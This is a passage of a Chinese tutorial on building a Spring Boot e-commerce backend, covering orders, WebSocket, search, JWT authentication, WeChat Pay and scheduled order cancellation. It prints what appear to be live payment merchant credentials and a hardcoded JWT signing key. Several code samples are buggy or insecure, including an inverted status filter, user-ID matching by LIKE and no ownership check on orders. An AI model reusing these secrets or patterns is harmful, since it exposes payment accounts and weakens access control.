这里涉及到内网穿透的知识点，但是如果部署到云服务器上的可以忽略这一步 订单状态查询该接口实现比较简单 service @Override public ResultVO getOrderById(String orderId) &#123; Orders orders = ordersMapper.selectByPrimaryKey(orderId); return ResultVO.success(orders.getStatus()); &#125; controller @GetMapping(&quot;/status/&#123;oid&#125;&quot;) public ResultVO getStatus(@PathVariable(&quot;oid&quot;) String oid, @RequestHeader(&quot;token&quot;) String token)&#123; return orderService.getOrderById(oid); &#125; 测试接口 websocket消息推送 创建webSocket服务器 添加依赖 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-websocket&lt;/artifactId&gt; &lt;/dependency&gt; 添加websocket服务节点配置（Java配置⽅式） package com.qfedu.fmmall.websocket; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.web.socket.server.standard.ServerEndpointExporter; @Configuration public class WebSocketConfig &#123; @Bean public ServerEndpointExporter getServerEndpointExporter()&#123; return new ServerEndpointExporter(); &#125; &#125; 创建websocket服务器 package com.qfedu.fmmall.websocket; import org.springframework.context.annotation.Bean; import org.springframework.stereotype.Component; import javax.websocket.OnClose; import javax.websocket.OnOpen; import javax.websocket.Session; import javax.websocket.server.PathParam; import javax.websocket.server.ServerEndpoint; import java.util.concurrent.ConcurrentHashMap; @Component @ServerEndpoint(&quot;/webSocket/&#123;oid&#125;&quot;) public class WebSocketServer &#123; private static ConcurrentHashMap&lt;String,Session&gt; sessionMap = new ConcurrentHashMap&lt;&gt;(); /**前端发送请求建立websocket连接，就会执行@OnOpen方法**/ @OnOpen public void open(@PathParam(&quot;oid&quot;) String orderId, Session session)&#123; System.out.println(&quot;------------建立连接：&quot;+orderId); sessionMap.put(orderId,session); &#125; /**前端关闭页面或者主动关闭websocket连接，都会执行close**/ @OnClose public void close(@PathParam(&quot;oid&quot;) String orderId)&#123; sessionMap.remove(orderId); &#125; public static void sendMsg(String orderId,String msg)&#123; try &#123; Session session = sessionMap.get(orderId); session.getBasicRemote().sendText(msg); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125; 在PayController中添加使用websocket与前端通信的代码 订单超时取消-定时任务 当用户提交订单后，没有在规定时间内进行支付操作，该订单讲自动取消，还原商品库存信息 定时任务(quartz） 延时队列（MQ） 首先查询已失效的未支付订单 订单的有效支付时间是半小时，因此判断订单是否失效，就是从当前时间下，向前推半个小时， 如果订单的创建时间不在此范围内则属于失效的订单 需要注意的是，在数据库查询到是 未支付 状态的不一定就一定是未支付，因为支付平台支付成功对服务器响应过程中可能 出现意想不到的问题，所以在修改订单状态之前一定要向支付平台确认此订单的状态，若已经支付则修改支付状态为已支付（2） 若仍然是未支付则取消订单，取消订单后需要修改订单状态 为支付失败(6)，并向支付平台通知取消支付链接，恢复商品的库存，就是ProductSku.stock + OrderItem.buy_conuts 这里需要考虑到数据库的并发问题，需要加锁和事务管理，隔离级别是 串行化，以保证数据的正确性和一致性 dao @Transactional(isolation = Isolation.SERIALIZABLE) // 隔离级别是 串行化 public void closeOrder(String orderId) &#123; synchronized (this)&#123; Orders orders = ordersMapper.selectByPrimaryKey(orderId); orders.setStatus(&quot;6&quot;); orders.setCloseType(1); // 失败原因未支付 // 将订单状态改为支付失败 ordersMapper.updateByPrimaryKeySelective(orders); // 根据订单id查询商品快照 Example example = new Example(OrderItem.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;orderId&quot;, orderId); List&lt;OrderItem&gt; orderItems = orderItemMapper.selectByExample(example); for (OrderItem orderItem : orderItems) &#123; String skuId = orderItem.getSkuId(); ProductSku productSku = productSkuMapper.selectByPrimaryKey(skuId); productSku.setStock(productSku.getStock() + orderItem.getBuyCounts()); productSkuMapper.updateByPrimaryKeySelective(productSku); &#125; &#125; &#125; service @Scheduled(cron = &quot;0/60 * * * * ?&quot;) public void checkAndCloseOrder() &#123; // 首先查询已失效的未支付订单 // 订单的有效支付时间是半小时，因此判断订单是否失效，就是从当前时间下，向前推半个小时， // 如果订单的创建时间不在此范围内则属于失效的订单 // 需要注意的是，在数据库查询到是 未支付 状态的不一定就一定是未支付，因为支付平台支付成功对服务器响应过程中可能 // 出现意想不到的问题，所以在修改订单状态之前一定要向支付平台确认此订单的状态，若仍然是 未支付 则取消订单 // 取消订单后需要修改订单状态 为支付失败(6)，并向支付平台通知取消支付链接 // 取消订单后，需要恢复商品的库存，就是ProductSku中的stock + OrderItem(订单快照)中的buy_conuts // 这里需要考虑到数据库的并发问题，需要加锁和事务管理 // 1.查询超过三十分钟未支付订单 try&#123; System.out.println(&quot;1——————————————————————----1&quot;); Example example = new Example(Orders.class); Example.Criteria criteria = example.createCriteria(); Date time = new Date(System.currentTimeMillis() - 30 * 60 * 1000); criteria.andLessThan(&quot;createTime&quot;, time); List&lt;Orders&gt; orders = ordersMapper.selectByExample(example); //2.访问微信平台接口，确认当前订单最终的支付状态 for (int i = 0; i &lt; orders.size(); i++) &#123; Orders order = orders.get(i); HashMap&lt;String, String&gt; params = new HashMap&lt;&gt;(); params.put(&quot;out_trade_no&quot;, order.getOrderId()); // 使用微信支付提供发接口查询订单的支付状态 Map&lt;String, String&gt; resp = wxPay.orderQuery(params); if(&quot;SUCCESS&quot;.equalsIgnoreCase(resp.get(&quot;trade_state&quot;)))&#123; //2.1 如果订单已经支付，则修改订单状态为&quot;代发货/已支付&quot; status = 2 Orders updateOrder = new Orders(); updateOrder.setOrderId(order.getOrderId()); updateOrder.setStatus(&quot;2&quot;); ordersMapper.updateByPrimaryKeySelective(updateOrder); &#125;else if(&quot;NOTPAY&quot;.equalsIgnoreCase(resp.get(&quot;trade_state&quot;)))&#123; //2.2 如果确实未支付 则取消订单： // a.向微信支付平台发送请求，关闭当前订单的支付链接 Map&lt;String, String&gt; map = wxPay.closeOrder(params); System.out.println(map); // b.关闭订单 orderService.closeOrder(order.getOrderId()); &#125; &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; 1.12 根据品牌筛选商品获取某个商品的所有品牌 sql 首先根据分类的category_id获取该分类下的所有商品，再从这些商品中获取到品牌名称 select product_id from product where category_id&#x3D; cid select select DISTINCT brand from product_params where product_id in cids &#x2F;&#x2F; 合并 select select DISTINCT brand from product_params where product_id in ( select product_id from product where category_id&#x3D; cid ) dao /** * 根据类别id查询此类别下的商品的品牌列表 * @param cid * @return */ public List&lt;String&gt; selectBrandByCategoryId(int cid); &lt;select id=&quot;selectBrandByCategoryId&quot; resultSets=&quot;java.util.List&quot; resultType=&quot;String&quot;&gt; select DISTINCT brand from product_params where product_id in ( select product_id from product where category_id=#&#123;cid&#125; ) &lt;/select&gt; service @Override public ResultVO listBrands(int categoryId) &#123; List&lt;String&gt; brands = productMapper.selectBrandByCategoryId(categoryId); return new ResultVO(ResStatus.OK,&quot;success&quot;,brands); &#125; controller @GetMapping(&quot;/listbrands/&#123;cid&#125;&quot;) public ResultVO getListBrands(@PathVariable(&quot;cid&quot;) String cid)&#123; return productService.listBrands(Integer.parseInt(cid)); &#125; 根据分类和品牌分页查询商品 请求url 响应结果 product/listbycid/49?pageNum=1&amp;limit=4 sql 由响应数据可以看出是分页查询，并且将商品的价格最低的sku一起返回 select * from product_sku where prodoct_id &#x3D; 1 ORDER BY sell_price limit 0,1 select * from product where category_id &#x3D; 49 dao * 根据三级分类ID分页查询商品信息 * @param cid 三级分类id * @param start 起始索引 * @param limit 查询记录数 * @return */ public List&lt;ProductVO&gt; selectProductByCategoryId(@Param(&quot;cid&quot;) int cid, @Param(&quot;start&quot;) int start, @Param(&quot;limit&quot;) int limit); &lt;resultMap id=&quot;ProductVOMap2&quot; type=&quot;com.qfedu.fmmall.entity.ProductVO&quot;&gt; &lt;id column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;product_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productName&quot; /&gt; &lt;result column=&quot;category_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;categoryId&quot; /&gt; &lt;result column=&quot;root_category_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;rootCategoryId&quot; /&gt; &lt;result column=&quot;sold_num&quot; jdbcType=&quot;INTEGER&quot; property=&quot;soldNum&quot; /&gt; &lt;result column=&quot;product_status&quot; jdbcType=&quot;INTEGER&quot; property=&quot;productStatus&quot; /&gt; &lt;result column=&quot;create_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;createTime&quot; /&gt; &lt;result column=&quot;update_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;updateTime&quot; /&gt; &lt;result column=&quot;content&quot; jdbcType=&quot;LONGVARCHAR&quot; property=&quot;content&quot; /&gt; &lt;!-- 根据商品ID查询价格最低的套餐 --&gt; &lt;collection property=&quot;skus&quot; column=&quot;product_id&quot; select=&quot;com.qfedu.fmmall.dao.ProductSkuMapper.selectLowerestPriceByProductId&quot;/&gt; &lt;/resultMap&gt; &lt;select id=&quot;selectProductByCategoryId&quot; resultMap=&quot;ProductVOMap2&quot;&gt; select product_id, product_name, category_id, root_category_id, sold_num, product_status, content, create_time, update_time from product where category_id=#&#123;cid&#125; limit #&#123;start&#125;,#&#123;limit&#125; &lt;/select&gt; selectLowerestPriceByProductId &lt;resultMap id=&quot;BaseResultMap&quot; type=&quot;com.qfedu.fmmall.entity.ProductSku&quot;&gt; &lt;id column=&quot;sku_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuId&quot; /&gt; &lt;result column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;sku_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuName&quot; /&gt; &lt;result column=&quot;sku_img&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuImg&quot; /&gt; &lt;result column=&quot;untitled&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;untitled&quot; /&gt; &lt;result column=&quot;original_price&quot; jdbcType=&quot;INTEGER&quot; property=&quot;originalPrice&quot; /&gt; &lt;result column=&quot;sell_price&quot; jdbcType=&quot;INTEGER&quot; property=&quot;sellPrice&quot; /&gt; &lt;result column=&quot;discounts&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;discounts&quot; /&gt; &lt;result column=&quot;stock&quot; jdbcType=&quot;INTEGER&quot; property=&quot;stock&quot; /&gt; &lt;result column=&quot;create_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;createTime&quot; /&gt; &lt;result column=&quot;update_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;updateTime&quot; /&gt; &lt;result column=&quot;status&quot; jdbcType=&quot;INTEGER&quot; property=&quot;status&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;selectLowerestPriceByProductId&quot; resultMap=&quot;BaseResultMap&quot;&gt; select sku_id,product_id,sku_name, sku_img,untitled,original_price,sell_price, discounts,stock,create_time,update_time,status from product_sku where product_id = #&#123;productId&#125; ORDER BY sell_price limit 0,1 &lt;/select&gt; service @Override public ResultVO getProductsByCategoryId(int categoryId, int pageNum, int limit) &#123; //1.查询分页数据 int start = (pageNum-1)*limit; List&lt;ProductVO&gt; productVOS = productMapper.selectProductByCategoryId(categoryId, start, limit); //2.查询当前类别下的商品的总记录数 Example example = new Example(Product.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;categoryId&quot;,categoryId); int count = productMapper.selectCountByExample(example); //3.计算总页数 int pageCount = count%limit==0? count/limit : count/limit+1; //4.封装返回数据 PageHelper&lt;ProductVO&gt; pageHelper = new PageHelper&lt;&gt;(count, pageCount, productVOS); return new ResultVO(ResStatus.OK,&quot;SUCCESS&quot;,pageHelper); &#125; controller @ApiOperation(&quot;商品品牌分页查询接口&quot;) @GetMapping(&quot;/listbycid/&#123;cid&#125;&quot;) public ResultVO getProductsByCategoryId(@PathVariable(&quot;cid&quot;) String cid, @RequestParam(&quot;pageNum&quot;) int pageNum, @RequestParam(&quot;limit&quot;) int limit)&#123; return productService.getProductsByCategoryId(Integer.parseInt(cid), pageNum, limit); &#125; 1.13 关键字搜索商品 搜索相关商品的品牌 dao &lt;select id=&quot;selectBrandByKeyword&quot; resultSets=&quot;java.util.List&quot; resultType=&quot;String&quot;&gt; select DISTINCT brand from product_params where product_id in ( select product_id from product where product_name like #&#123;kw&#125; ) &lt;/select&gt; service @Override public ResultVO listBrands(String kw) &#123; kw = &quot;%&quot;+kw+&quot;%&quot;; List&lt;String&gt; brands = productMapper.selectBrandByKeyword(kw); return new ResultVO(ResStatus.OK,&quot;SUCCESS&quot;,brands); &#125; 搜索出包含关键词的商品 dao &lt;select id=&quot;selectProductByKeyword&quot; resultMap=&quot;ProductVOMap2&quot;&gt; select product_id, product_name, category_id, root_category_id, sold_num, product_status, content, create_time, update_time from product where product_name like #&#123;kw&#125; limit #&#123;start&#125;,#&#123;limit&#125; &lt;/select&gt; service @Override public ResultVO searchProduct(String kw, int pageNum, int limit) &#123; //1.查询搜索结果 kw = &quot;%&quot;+kw+&quot;%&quot;; int start = (pageNum-1)*limit; List&lt;ProductVO&gt; productVOS = productMapper.selectProductByKeyword(kw, start, limit); //2.查询总记录数 Example example = new Example(Product.class); Example.Criteria criteria = example.createCriteria(); criteria.andLike(&quot;productName&quot;,kw); int count = productMapper.selectCountByExample(example); //3.计算总页数 int pageCount = count%limit==0? count/limit:count/limit+1; //4.封装，返回数据 PageHelper&lt;ProductVO&gt; pageHelper = new PageHelper&lt;&gt;(count, pageCount, productVOS); ResultVO resultVO = new ResultVO(ResStatus.OK, &quot;SUCCESS&quot;, pageHelper); return resultVO; &#125; 1.14 个人中心显示所有订单 order/list?userId=15&amp;pageNum=1&amp;limit=5&amp;status=1 dao OrdersMapper public List&lt;OrdersVO&gt; selectOrders(@Param(&quot;userId&quot;) String userId, @Param(&quot;status&quot;) String status, @Param(&quot;start&quot;) int start, @Param(&quot;limit&quot;) int limit); &lt;resultMap id=&quot;OrdersVOMap&quot; type=&quot;com.qfedu.fmmall.entity.OrdersVO&quot;&gt; &lt;id column=&quot;order_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;orderId&quot; /&gt; &lt;result column=&quot;user_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userId&quot; /&gt; &lt;result column=&quot;untitled&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;untitled&quot; /&gt; &lt;result column=&quot;receiver_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;receiverName&quot; /&gt; &lt;result column=&quot;receiver_mobile&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;receiverMobile&quot; /&gt; &lt;result column=&quot;receiver_address&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;receiverAddress&quot; /&gt; &lt;result column=&quot;total_amount&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;totalAmount&quot; /&gt; &lt;result column=&quot;actual_amount&quot; jdbcType=&quot;INTEGER&quot; property=&quot;actualAmount&quot; /&gt; &lt;result column=&quot;pay_type&quot; jdbcType=&quot;INTEGER&quot; property=&quot;payType&quot; /&gt; &lt;result column=&quot;order_remark&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;orderRemark&quot; /&gt; &lt;result column=&quot;status&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;status&quot; /&gt; &lt;result column=&quot;delivery_type&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;deliveryType&quot; /&gt; &lt;result column=&quot;delivery_flow_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;deliveryFlowId&quot; /&gt; &lt;result column=&quot;order_freight&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;orderFreight&quot; /&gt; &lt;result column=&quot;delete_status&quot; jdbcType=&quot;INTEGER&quot; property=&quot;deleteStatus&quot; /&gt; &lt;result column=&quot;create_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;createTime&quot; /&gt; &lt;result column=&quot;update_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;updateTime&quot; /&gt; &lt;result column=&quot;pay_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;payTime&quot; /&gt; &lt;result column=&quot;delivery_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;deliveryTime&quot; /&gt; &lt;result column=&quot;flish_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;flishTime&quot; /&gt; &lt;result column=&quot;cancel_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;cancelTime&quot; /&gt; &lt;result column=&quot;close_type&quot; jdbcType=&quot;INTEGER&quot; property=&quot;closeType&quot; /&gt; &lt;collection property=&quot;orderItems&quot; column=&quot;order_id&quot; select=&quot;com.qfedu.fmmall.dao.OrderItemMapper.listOrderItemsByOrderId&quot;/&gt; &lt;/resultMap&gt; &lt;select id=&quot;selectOrders&quot; resultMap=&quot;OrdersVOMap&quot;&gt; select order_id,user_id,untitled,receiver_name, receiver_mobile,receiver_address, total_amount, actual_amount,pay_type,order_remark,status,delivery_type, delivery_flow_id,order_freight,delete_status,create_time, update_time,pay_time,delivery_time, flish_time,cancel_time,close_type from orders where user_id=#&#123;userId&#125; &lt;if test=&quot;status != null&quot;&gt; and status=#&#123;status&#125; &lt;/if&gt; limit #&#123;start&#125;,#&#123;limit&#125; &lt;/select&gt; OrderItemMapper public List&lt;OrderItem&gt; listOrderItemsByOrderId(String orderId); &lt;resultMap id=&quot;BaseResultMap&quot; type=&quot;com.qfedu.fmmall.entity.OrderItem&quot;&gt; &lt;id column=&quot;item_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;itemId&quot; /&gt; &lt;result column=&quot;order_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;orderId&quot; /&gt; &lt;result column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;product_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productName&quot; /&gt; &lt;result column=&quot;product_img&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productImg&quot; /&gt; &lt;result column=&quot;sku_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuId&quot; /&gt; &lt;result column=&quot;sku_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuName&quot; /&gt; &lt;result column=&quot;product_price&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;productPrice&quot; /&gt; &lt;result column=&quot;buy_counts&quot; jdbcType=&quot;INTEGER&quot; property=&quot;buyCounts&quot; /&gt; &lt;result column=&quot;total_amount&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;totalAmount&quot; /&gt; &lt;result column=&quot;basket_date&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;basketDate&quot; /&gt; &lt;result column=&quot;buy_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;buyTime&quot; /&gt; &lt;result column=&quot;is_comment&quot; jdbcType=&quot;INTEGER&quot; property=&quot;isComment&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;listOrderItemsByOrderId&quot; resultMap=&quot;BaseResultMap&quot;&gt; select item_id, order_id, product_id, product_name, product_img, sku_id, sku_name, product_price, buy_counts, total_amount, basket_date, buy_time, is_comment from order_item where order_id=#&#123;orderId&#125; &lt;/select&gt; service @Override public ResultVO listOrders(String userId, String status, int pageNum, int limit) &#123; Example example = new Example(Orders.class); Example.Criteria criteria = example.createCriteria(); criteria.andLike(&quot;userId&quot;, userId); if(status != null &amp;&amp; &quot;&quot;.equals(status))&#123; criteria.andEqualTo(&quot;status&quot;,status); &#125; int count = ordersMapper.selectCountByExample(example); //2.计算总页数（必须确定每页显示多少条 pageSize = limit） int pageCount = count%limit==0? count/limit : count/limit+1; int start = (pageNum-1)*limit; List&lt;OrdersVO&gt; ordersVOS = ordersMapper.selectOrders(userId, status, start, limit); PageHelper&lt;OrdersVO&gt; ordersVOPageHelper = new PageHelper&lt;&gt;(count, pageCount, ordersVOS); return ResultVO.success(ordersVOPageHelper); &#125; controller @GetMapping(&quot;/list&quot;) public ResultVO getList(String userId, String status, int pageNum, int limit)&#123; return orderService.listOrders(userId, status, pageNum,limit); &#125; 收货地址管理2 JWT实现权限认证2.1 JWT实现导入JWT依赖&lt;dependency&gt; &lt;groupId&gt;com.auth0&lt;/groupId&gt; &lt;artifactId&gt;java-jwt&lt;/artifactId&gt; &lt;version&gt;3.10.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt&lt;/artifactId&gt; &lt;version&gt;0.9.1&lt;/version&gt; &lt;/dependency&gt; 生成对应的token并返回给前端// 验证成功则生成对应的token // 使用jwt生成token JwtBuilder builder = Jwts.builder(); Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;key1&quot;, &quot;value2&quot;); map.put(&quot;key2&quot;, &quot;value2&quot;); JwtBuilder jwtBuilder = builder.setSubject(username) //设置subject .setIssuedAt(new Date()) // 设置token生成的时间 .setId(user.getUserId() + &quot;&quot;) // 设置userid为token的唯一id .setClaims(map) // map中可以存放用户的角色和权限信息 .setExpiration(new Date(System.currentTimeMillis() + 24 * 60 * 60 * 1000 * 2)) // 设置token的过期时间 为两天 .signWith(SignatureAlgorithm.HS256, &quot;sunzy123456&quot;);// 设置token的加密方式和加密密钥 String token = jwtBuilder.compact(); // 获取token return new ResultVO(ResStatus.OK, token, user); 前端进行登录验证时获取对应的token JWT进行token解析if(token == null || &quot;&quot;.equals(token))&#123; return new ResultVO(ResStatus.NO, &quot;failed&quot;, null); &#125;else &#123; JwtParser parser = Jwts.parser(); parser.setSigningKey(&quot;sunzy123456&quot;); // 密钥需要与加密时使用的一致 try&#123; // 如果token正确 且在有效期内 则解析正常否则会出现异常 Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token); Claims body = claimsJws.getBody(); // 获取token中的用户数据 String subject = body.getSubject(); // 获取token中发subject String key1 = body.get(&quot;key1&quot;, String.class); /// 获取添加在map中的值 &#125;catch(UnsupportedJwtException e)&#123; return new ResultVO(ResStatus.NO, &quot;token不合法请重新登录！&quot;, null); &#125;catch(ExpiredJwtException e)&#123; return new ResultVO(ResStatus.NO, &quot;token已过期，请重新登录！&quot;, null); &#125; catch (Exception e)&#123; return new ResultVO(ResStatus.NO, &quot;未知错误&quot;, null); &#125; 使用拦截器验证token 创建拦截器 package com.sunzy.fmmall.interceptor; import com.alibaba.fastjson.JSON; import com.sunzy.fmmall.vo.ResStatus; import com.sunzy.fmmall.vo.ResultVO; import io.jsonwebtoken.*; import org.springframework.context.annotation.Configuration; import org.springframework.stereotype.Component; import org.springframework.web.servlet.HandlerInterceptor; import org.springframework.web.servlet.ModelAndView; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; @Component public class CheckTokenInterceptor implements HandlerInterceptor &#123; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; String token = request.getParameter(&quot;token&quot;); if (token == null || &quot;&quot;.equals(token)) &#123; doResponse(response, &quot;请先登录！&quot;); return false; &#125; else &#123; JwtParser parser = Jwts.parser(); parser.setSigningKey(&quot;sunzy123456&quot;); // 密钥需要与加密时使用的一致 try &#123; // 如果token正确 且在有效期内 则解析正常否则会出现异常 Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token); Claims body = claimsJws.getBody(); // 获取token中的用户数据 String subject = body.getSubject(); // 获取token中发subject String key1 = body.get(&quot;key1&quot;, String.class); /// 获取添加在map中的值 return true; &#125; catch (UnsupportedJwtException e) &#123; doResponse(response,&quot;token不合法，请重新登录！&quot;); &#125; catch (ExpiredJwtException e) &#123; doResponse(response,&quot;token已过期，请重新登录！&quot;); &#125; catch (Exception e) &#123; doResponse(response,&quot;未知错误！&quot;); &#125; return false; &#125; &#125; private void doResponse(HttpServletResponse response, String msg) throws IOException &#123; ResultVO resultVO = new ResultVO(ResStatus.NO, msg, null); String string = JSON.toJSONString(resultVO); response.setContentType(&quot;application/json&quot;); response.setCharacterEncoding(&quot;utf-8&quot;); PrintWriter writer = response.getWriter(); writer.write(string); writer.flush(); writer.close(); &#125; &#125; 配置拦截器 package com.sunzy.fmmall.config; import com.sunzy.fmmall.interceptor.CheckTokenInterceptor; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.context.annotation.Configuration; import org.springframework.web.servlet.config.annotation.InterceptorRegistry; import org.springframework.web.servlet.config.annotation.WebMvcConfigurer; /** * 拦截器的配置类 */ @Configuration public class InterceptorConfig implements WebMvcConfigurer &#123; @Autowired private CheckTokenInterceptor checkTokenInterceptor; @Override public void addInterceptors(InterceptorRegistry registry) &#123; // registry是拦截器的注册器 // 将自己创建的拦截器加入进来 即可实现拦截功能 registry.addInterceptor(checkTokenInterceptor) .addPathPatterns(&quot;/**&quot;) // 拦截所有路径 .excludePathPatterns(&quot;/user/**&quot;); // 除了用户登录和注册路径 &#125; &#125; 2.2 通过header传递token 前端访问受限资源时，都必须携带token发送请求，token可以放在请求行(params)、请求头(header)以及请求体(data)，但是一般默认放在请求头中 前端使用axios axios(&#123; url:url, method:&quot;get&quot;, headers:&#123; token:token &#125;, params:&#123; userId:userId &#125; &#125;) 浏览器的预检机制 只要是带自定义header的跨域请求，在发送真实请求前都会先发送OPTIONS请求，浏览器根据OPTIONS请求返回的结果来决定是否继续发送真实的请求进行跨域资源访问。所以复杂请求肯定会两次请求服务端。 因此需要在拦截器中加入以下代码，必要响应第一次的OPTIONS请求后，才能收到第二次的GET请求。 String method = request.getMethod(); System.out.println(method); if(&quot;OPTIONS&quot;.equals(method))&#123; return true; &#125; 3.通用实体类3.1 用于响应的实体类 package com.qfedu.fmmall.vo; import io.swagger.annotations.ApiModel; import io.swagger.annotations.ApiModelProperty; import lombok.AllArgsConstructor; import lombok.Data; import lombok.NoArgsConstructor; import javax.annotation.Resource; @Data @NoArgsConstructor @AllArgsConstructor @ApiModel(value = &quot;ResultVO对象&quot;,description = &quot;封装接口返回给前端的数据&quot;) public class ResultVO &#123; //响应给前端的状态码 @ApiModelProperty(value = &quot;响应状态码&quot;,dataType = &quot;int&quot;) private int code; //响应给前端的提示信息 @ApiModelProperty(&quot;响应提示信息&quot;) private String msg; //响应给前端的数据 @ApiModelProperty(&quot;响应数据&quot;) private Object data; public static ResultVO success()&#123; return new ResultVO(ResStatus.OK, &quot;success&quot;, null); &#125; public static ResultVO success(String msg)&#123; return new ResultVO(ResStatus.OK, msg, null); &#125; public static ResultVO success(Object obj)&#123; return new ResultVO(ResStatus.OK, &quot;success&quot;, obj); &#125; public static ResultVO failed()&#123; return new ResultVO(ResStatus.NO, &quot;failed&quot;, null); &#125; public static ResultVO failed(String msg)&#123; return new ResultVO(ResStatus.NO, msg, null); &#125; &#125; 4 微信支付 通过微信平台为商家提供代收款服务 4.1 商户注册微信支付业务 商户编号：1497984412 商户账号AppID：wx632c8f211f8122c6 商户Key：sbNCm1JnevqI36LrEaxFwcaT0hkGxFnC 4.2 商户向微信申请支付订单，即支付短链接 导入微信支付的依赖 &lt;dependency&gt; &lt;groupId&gt;com.github.wxpay&lt;/groupId&gt; &lt;artifactId&gt;wxpay-sdk&lt;/artifactId&gt; &lt;version&gt;0.0.3&lt;/version&gt; &lt;/dependency&gt; 创建WXPayConfig，重写里面的方法，设置自己的AppID，商户id，密钥， public class MyPayConfig implements WXPayConfig &#123; @Override public String getAppID() &#123; return &quot;wx632c8f211f8122c6&quot;; &#125; @Override public String getMchID() &#123; return &quot;1497984412&quot;; &#125; @Override public String getKey() &#123; return &quot;sbNCm1JnevqI36LrEaxFwcaT0hkGxFnC&quot;; &#125; @Override public InputStream getCertStream() &#123; return null; &#125; @Override public int getHttpConnectTimeoutMs() &#123; return 0; &#125; @Override public int getHttpReadTimeoutMs() &#123; return 0; &#125; &#125; 设置⽀付订单的参数 HashMap&lt;String,String&gt; data = new HashMap&lt;&gt;(); data.put(&quot;body&quot;,&quot;咪咪萧条&quot;); //商品描述 data.put(&quot;out_trade_no&quot;,orderId); //使⽤当前⽤户订单的编号作为当前⽀付交易的 交易号 data.put(&quot;fee_type&quot;,&quot;CNY&quot;); //⽀付币种 data.put(&quot;total_fee&quot;,&quot;1&quot;); //⽀付⾦额 data.put(&quot;trade_type&quot;,&quot;NATIVE&quot;); //交易类型 data.put(&quot;notify_url&quot;,&quot;/pay/success&quot;); //设置⽀付完成时的回调⽅法 接⼝ 申请支付连接 WXPay wxPay = new WXPay(new MyPayConfig()); Map&lt;String, String&gt; resp = wxPay.unifiedOrder(data); //发送请求 orderInfo.put(&quot;payUrl&quot;,resp.get(&quot;code_url&quot;)); 5 Ngrok实现内网穿透 注册Ngrok后进行实名认证 开通隧道 获取隧道ID 下载ngork客户端 启动客户端，输入对应的隧道ID，即可实现内网穿透 6 quartz定时任务框架使⽤6.1 导入依赖&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-quartz&lt;/artifactId&gt; &lt;/dependency&gt; 6.2 创建定时任务@Component public class PrintHelloWorldJob &#123; //https://cron.qqe2.com @Scheduled(cron = &quot;0/3 * * * * ?&quot;) public void printHelloWorld()&#123; System.out.println(&quot;----hello world.&quot;); &#125; &#125; 6.3 在启动类添加注解以开启定时任务@SpringBootApplication @EnableScheduling public class QuartzDemoApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(QuartzDemoApplication.class, args); &#125; &#125; 当控制台打印出这段日志时，说明定时任务创建成功 7 后端项目部署使用docker部署项目 Dockerfile FROM 